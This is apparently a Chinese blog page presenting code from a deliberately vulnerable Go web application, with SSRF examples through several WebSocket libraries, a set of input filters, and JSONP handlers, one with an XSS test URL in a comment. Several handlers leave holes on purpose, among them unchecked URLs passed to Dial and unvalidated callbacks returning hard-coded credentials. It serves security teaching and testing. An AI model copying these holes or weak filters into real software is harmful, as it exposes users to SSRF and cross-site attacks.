<h2 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/gobwas/ws Dialer Dial</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/gorilla/websocket Dialer</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/sacOO7/gowebsocket &quot;&quot; New,BuildProxy</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor golang.org/x/net/websocket &quot;&quot; Dial,NewConfig,DialConfig</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor nhooyr.io/websocket &quot;&quot; Dial</span></span><br></pre></td></tr></table></figure>



<h3 id="golang-org-x-net-websocket"><a href="#golang-org-x-net-websocket" class="headerlink" title="golang.org&#x2F;x&#x2F;net&#x2F;websocket"></a>golang.org&#x2F;x&#x2F;net&#x2F;websocket</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/ssti/vuln/websocket?url=ws://localhost:233</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:233/ssti/vuln/websocket?url=ws://localhost:243</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFSafeXWebsocketController)</span></span> Get() &#123;</span><br><span class="line">	wsurl := c.GetString(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;ws://localhost:243&quot;</span>)</span><br><span class="line">	<span class="comment">//untrustedInput := &quot;ws://localhost:243&quot;</span></span><br><span class="line">	origin := <span class="string">&quot;http://localhost/&quot;</span></span><br><span class="line">	<span class="comment">// bad as input is directly passed to dial function</span></span><br><span class="line">	rightwsurl := strings.TrimRight(wsurl, <span class="string">&quot;\n\r&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> rightwsurl == <span class="string">&quot;ws://localhost:243/ws&quot;</span> &#123;</span><br><span class="line">		ws, err := websocket.Dial(wsurl, <span class="string">&quot;&quot;</span>, origin)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			errorMsg := fmt.Sprintf(<span class="string">&quot;Error connecting to WebSocket: %v\n&quot;</span>, err)</span><br><span class="line">			c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(errorMsg))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">var</span> msg = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">512</span>)</span><br><span class="line">		<span class="keyword">var</span> n <span class="type">int</span></span><br><span class="line">		n, _ = ws.Read(msg)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Received: %s.\n&quot;</span>, msg[:n])</span><br><span class="line">		c.Ctx.ResponseWriter.Write(msg[:n])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="github-com-gorilla-websocket"><a href="#github-com-gorilla-websocket" class="headerlink" title="github.com&#x2F;gorilla&#x2F;websocket"></a>github.com&#x2F;gorilla&#x2F;websocket</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFVulngorillaWebsocketController)</span></span> Get() &#123;</span><br><span class="line">	untrustedInput := c.GetString(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;ws://localhost:243&quot;</span>)</span><br><span class="line">	<span class="comment">//untrustedInput := &quot;ws://localhost:233&quot;</span></span><br><span class="line">	<span class="comment">//origin := &quot;http://localhost/&quot;</span></span><br><span class="line">	dialer := gorilla_websocket.Dialer&#123;&#125;</span><br><span class="line">	conn, _, err := dialer.Dial(untrustedInput, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Error connecting to WebSocket:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="nhooyr-io-websocket"><a href="#nhooyr-io-websocket" class="headerlink" title="nhooyr.io&#x2F;websocket"></a>nhooyr.io&#x2F;websocket</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFVulnnhooyrWebsocketController)</span></span> Get() &#123;</span><br><span class="line">	untrustedInput := c.GetString(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;ws://localhost:243&quot;</span>)</span><br><span class="line">	<span class="comment">//untrustedInput := &quot;ws://localhost:233&quot;</span></span><br><span class="line">	<span class="comment">//origin := &quot;http://localhost/&quot;</span></span><br><span class="line">	conn, _, err := nhooyr_websocket.Dial(context.Background(), untrustedInput, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		errorMsg := fmt.Sprintf(<span class="string">&quot;Error connecting to WebSocket:&quot;</span>, err)</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(errorMsg))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	conn.Close(nhooyr_websocket.StatusNormalClosure, <span class="string">&quot;Closing connection&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="github-com-gobwas-ws"><a href="#github-com-gobwas-ws" class="headerlink" title="github.com&#x2F;gobwas&#x2F;ws"></a>github.com&#x2F;gobwas&#x2F;ws</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	gobwas_websocket <span class="string">&quot;github.com/gobwas/ws&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	untrustedInput := <span class="string">&quot;ws://localhost:233&quot;</span></span><br><span class="line">	_, _, _, err := gobwas_websocket.Dial(context.TODO(), untrustedInput)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Error connecting to WebSocket:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="github-com-sacOO7-gowebsocket"><a href="#github-com-sacOO7-gowebsocket" class="headerlink" title="github.com&#x2F;sacOO7&#x2F;gowebsocket"></a>github.com&#x2F;sacOO7&#x2F;gowebsocket</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/sacOO7/gowebsocket&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 创建一个 WebSocket 连接</span></span><br><span class="line">	socket := gowebsocket.New(<span class="string">&quot;ws://localhost:233&quot;</span>)</span><br><span class="line">	<span class="comment">// 设置接收消息时的处理函数</span></span><br><span class="line">	socket.OnTextMessage = <span class="function"><span class="keyword">func</span><span class="params">(message <span class="type">string</span>, socket gowebsocket.Socket)</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Received message:&quot;</span>, message)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置连接关闭时的处理函数</span></span><br><span class="line">	socket.OnConnected = <span class="function"><span class="keyword">func</span><span class="params">(socket gowebsocket.Socket)</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Connected to WebSocket!&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置连接失败时的处理函数</span></span><br><span class="line">	socket.OnConnectError = <span class="function"><span class="keyword">func</span><span class="params">(err <span class="type">error</span>, socket gowebsocket.Socket)</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Failed to connect to WebSocket:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置连接断开时的处理函数</span></span><br><span class="line">	socket.OnDisconnected = <span class="function"><span class="keyword">func</span><span class="params">(err <span class="type">error</span>, socket gowebsocket.Socket)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;Disconnected from WebSocket:&quot;</span>, err)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;Disconnected from WebSocket&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 连接到 WebSocket 服务器</span></span><br><span class="line">	socket.Connect()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 等待程序退出</span></span><br><span class="line">	<span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CommandInjectFilter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CorsFilter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> FileUploadFilter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> JsonpFilter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PathTraversalFilter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SSRFFilter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> XSSFilter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CommandInjectFilter)</span></span> DoFilter(input <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	r, _ := regexp.Compile(<span class="string">`^[a-zA-Z0-9_/\.-]+$`</span>)</span><br><span class="line">	<span class="keyword">return</span> r.MatchString(input)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CorsFilter)</span></span> DoFilter(input <span class="type">string</span>, whitelists []<span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> whitelists &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.HasSuffix(input, <span class="string">&quot;.&quot;</span>+v) || input == v &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *FileUploadFilter)</span></span> DoFilter(input <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	r, _ := regexp.Compile(<span class="string">`\.\./`</span>)</span><br><span class="line">	<span class="keyword">return</span> r.MatchString(input)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *JsonpFilter)</span></span> DoFilter(input <span class="type">string</span>, whitelists []<span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	u, err := url.Parse(input)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> whitelists &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.HasSuffix(u.Host, <span class="string">&quot;.&quot;</span>+v) || input == v &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *PathTraversalFilter)</span></span> DoFilter(input <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	r, _ := regexp.Compile(<span class="string">`\.\.`</span>)</span><br><span class="line">	<span class="keyword">return</span> r.MatchString(input) || strings.HasPrefix(input, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFFilter)</span></span> DoBlackFilter(input <span class="type">string</span>, blacklists []<span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	u, err := url.Parse(input)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> blacklists &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.HasSuffix(u.Hostname(), v) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFFilter)</span></span> DoWhiteFilter(input <span class="type">string</span>, whitelists []<span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	u, err := url.Parse(input)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//exclude evil-example.com</span></span><br><span class="line">	<span class="keyword">if</span> strings.HasPrefix(u.Hostname(), <span class="string">&quot;.&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> whitelists &#123;</span><br><span class="line">			<span class="keyword">if</span> strings.HasSuffix(u.Hostname(), v) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> whitelists &#123;</span><br><span class="line">			<span class="keyword">if</span> u.Hostname() == v &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this filter comes from fix of cve-2022-0870 gogs SSRF</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFFilter)</span></span> DoGogsFilter(input <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> IsLocalHostname(input, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XSSFilter)</span></span> DoFilter(input <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">	mid := strings.ReplaceAll(input, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>)</span><br><span class="line">	mid = strings.ReplaceAll(mid, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>)</span><br><span class="line">	mid = strings.ReplaceAll(mid, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>)</span><br><span class="line">	mid = strings.ReplaceAll(mid, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&amp;quot;&quot;</span>)</span><br><span class="line">	mid = strings.ReplaceAll(mid, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&amp;#x27&quot;</span>)</span><br><span class="line">	output := strings.ReplaceAll(mid, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&amp;#x2F&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> output</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://127.0.0.1:233/jsonp/vuln/noCheck?callback=%3Cscript%3Ealert()%3C/script%3E</span></span><br><span class="line"><span class="comment">//	c.Ctx.ResponseWriter.Header().Set(&quot;Content-Type&quot;, &quot;text/html&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *JsonpVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	callback := c.GetString(<span class="string">&quot;callback&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>)</span><br><span class="line">	jsonp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	jsonp[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">	jsonp[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;admin@123&quot;</span></span><br><span class="line">	data, err := json.Marshal(jsonp)</span><br><span class="line">	output := callback + <span class="string">&quot;(&quot;</span> + <span class="type">string</span>(data) + <span class="string">&quot;)&quot;</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(output))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *JsonpVuln2Controller)</span></span> Get() &#123;</span><br><span class="line">	callback := c.GetString(<span class="string">&quot;callback&quot;</span>)</span><br><span class="line">	referer := c.Ctx.Request.Header.Get(<span class="string">&quot;referer&quot;</span>)</span><br><span class="line">	jsonpFilter := utils.JsonpFilter&#123;&#125;</span><br><span class="line">	whitelists := []<span class="type">string</span>&#123;<span class="string">&quot;localhost:233&quot;</span>, <span class="string">&quot;example.com&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">if</span> referer == <span class="string">&quot;&quot;</span> || jsonpFilter.DoFilter(referer, whitelists) &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>)</span><br><span class="line">		jsonp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">		jsonp[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">		jsonp[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;admin@123&quot;</span></span><br><span class="line">		data, err := json.Marshal(jsonp)</span><br><span class="line">		output := callback + <span class="string">&quot;(&quot;</span> + <span class="type">string</span>(data) + <span class="string">&quot;)&quot;</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(output))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *JsonpSafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	callback := c.GetString(<span class="string">&quot;callback&quot;</span>)</span><br><span class="line">	referer := c.Ctx.Request.Header.Get(<span class="string">&quot;referer&quot;</span>)</span><br><span class="line">	jsonpFilter := utils.JsonpFilter&#123;&#125;</span><br><span class="line">	whitelists := []<span class="type">string</span>&#123;<span class="string">&quot;localhost:233&quot;</span>, <span class="string">&quot;example.com&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">if</span> referer != <span class="string">&quot;&quot;</span> &amp;&amp; jsonpFilter.DoFilter(referer, whitelists) &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>)</span><br><span class="line">		jsonp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">		jsonp[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">		jsonp[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;admin@123&quot;</span></span><br><span class="line">		data, err := json.Marshal(jsonp)</span><br><span class="line">		output := callback + <span class="string">&quot;(&quot;</span> + <span class="type">string</span>(data) + <span class="string">&quot;)&quot;</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(output))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



